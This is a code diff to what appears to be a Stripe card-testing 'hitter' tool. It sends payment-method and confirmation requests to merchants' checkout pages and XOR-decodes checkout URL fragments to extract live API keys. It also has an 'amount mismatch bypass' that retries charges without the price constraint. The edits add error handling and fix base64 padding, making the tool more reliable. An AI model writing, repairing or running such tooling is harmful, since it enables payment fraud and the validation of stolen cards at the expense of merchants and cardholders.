@@ -1080,7 +1080,10 @@ class StripeAPIHitter:
                 _pm_param_retries = 0
                 while True:
                     pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(pm_url, headers=pm_headers, data=pm_data, timeout=30))
-                    pm_json = pm_res.json()
+                    try:
+                        pm_json = pm_res.json()
+                    except Exception:
+                        pm_json = {}
                     
                     err = pm_json.get('error', {})
                     if pm_res.status_code == 400 and err.get('code') == 'parameter_unknown' and _pm_param_retries < _pm_param_retry_limit:
@@ -1178,7 +1181,10 @@ class StripeAPIHitter:
                 confirm_headers["referer"] = checkout_page_url
                 # Use persistent session — cookies from warmup + elements session propagate to confirm
                 confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
-                confirm_json = confirm_res.json()
+                try:
+                    confirm_json = confirm_res.json()
+                except Exception:
+                    confirm_json = {}
                 
                 # Dynamic Amount Mismatch Bypass
                 # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
@@ -1216,7 +1222,10 @@ class StripeAPIHitter:
                         break
                     confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                     confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
-                    confirm_json = confirm_res.json()
+                    try:
+                        confirm_json = confirm_res.json()
+                    except Exception:
+                        confirm_json = {}
                     err_code = confirm_json.get('error', {}).get('code')
                     err_msg = confirm_json.get('error', {}).get('message', '') or ''
                     _param_retries += 1
@@ -1683,11 +1692,11 @@ class ConcurrentHitter:
                         import urllib.parse, base64, json as _json
                         decoded = urllib.parse.unquote(check_url[hash_idx+1:])
                         try:
-                            raw_bytes = base64.b64decode(decoded + '==')
+                            raw_bytes = base64.b64decode(decoded + '=' * (-len(decoded) % 4))
                             json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                             data = _json.loads(json_str)
                             pk_key = data.get('apiKey')
-                        except: pass
+                        except Exception: pass
                     if not pk_key:
                         pk_key = StripeAPIExtractor.extract_pk_live(html)
                     
@@ -1733,11 +1742,11 @@ class ConcurrentHitter:
             hash_str = self.url[hash_idx+1:]
             decoded = urllib.parse.unquote(hash_str)
             try:
-                raw_bytes = base64.b64decode(decoded + '==')
+                raw_bytes = base64.b64decode(decoded + '=' * (-len(decoded) % 4))
                 json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                 data = json.loads(json_str)
                 pk_key = data.get('apiKey')
-            except: pass
+            except Exception: pass
 
         if cs_token and pk_key:
             if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Instantly extracted Stripe keys..."})
@@ -1780,11 +1789,11 @@ class ConcurrentHitter:
                         hash_str = self.url[hash_idx+1:]
                         decoded = urllib.parse.unquote(hash_str)
                         try:
-                            raw_bytes = base64.b64decode(decoded + '==')
+                            raw_bytes = base64.b64decode(decoded + '=' * (-len(decoded) % 4))
                             json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                             data = json.loads(json_str)
                             pk_key = data.get('apiKey')
-                        except: pass
+                        except Exception: pass
                     if not pk_key:
                         pk_key = StripeAPIExtractor.extract_pk_live(html)
                         
